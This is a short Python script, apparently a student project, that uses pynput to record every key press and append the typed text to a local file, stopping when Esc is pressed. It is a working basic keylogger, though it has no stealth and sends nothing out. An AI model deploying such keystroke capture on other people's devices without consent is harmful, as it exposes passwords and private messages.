import pynput 
from pynput.keyboard import Key, Listener
count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count +=1
    print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

# to saved the typed text in a txt file 
def write_file(keys):
    #if file is not present or running code for first time we have to use "w" then afterwards use a+ 
    with open("MAJIOR PROJECT.txt","a+") as f:
        for key in keys:
            k = str(key).replace("'", "")
            # Key.space
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)

def on_release(key):
    # print('{0} released'.format(key))
    if key == Key.esc:
        return False # stop listener

with  Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
